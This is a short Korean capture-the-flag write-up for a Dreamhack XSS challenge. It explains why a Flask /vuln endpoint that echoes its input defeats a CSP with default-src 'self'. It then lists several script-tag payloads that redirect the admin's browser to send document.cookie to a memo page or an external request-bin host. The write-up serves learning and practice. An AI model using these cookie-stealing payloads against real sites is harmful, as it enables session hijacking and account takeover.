## 취약한 포인트

http://host3.dreamhack.games:9250/vuln?param=%3Cimg%20src=https://dreamhack.io/assets/img/logo.0a8aabe.svg%3E

스크립트를 넣을 수 있는 /vuln 포인트

```py
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```

param에 대한 검증 없이 그대로 올리기 때문

CSP를 헤더에 적용하여 XSS를 막으려 했지만 어림도 없음

```py
@app.after_request
def add_header(response):
    global nonce
    response.headers[
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response
```

왜냐면 default-src 'self'이므로, 해당(자기 자신) 도메인을 활용하면 우회가 되기 때문

Flag를 얻기 위해서는 admin의 cookie 값이 필요하므로 이것을 메모에 쓰도록 하면 될 것
이를 기반으로 exploit 구조를 간단히 생각해보면

http://127.0.0.1:8000/vuln?param={
    <script src=http://host3.dreamhack.games:9250/vuln?param=location.href='http://host3.dreamhack.games:9250/memo?memo=' + document.cookie;></script>
}


<script src="/vuln?param=document.location='http://host3.dreamhack.games:9250/memo?memo='%2Bdocument.cookie;"></script>

<script src="/vuln?param=document.location='http://127.0.0.1:8000/memo?memo='%2Bdocument.cookie;"></script>

<script src="/vuln?param=document.location='https://whimbuc.request.dreamhack.games?memo='%252Bdocument.cookie;"></script>


// +를 url encoding 하기 위해 %2B => %252B로

근데 생각해보니 memo는 각 사용자마다 관리되므로 외부 주소로 요청 받는게 좋을듯

<script src="/vuln?param=document.location='http://host3.dreamhack.games:9250/memo?memo='+document.cookie;"></script>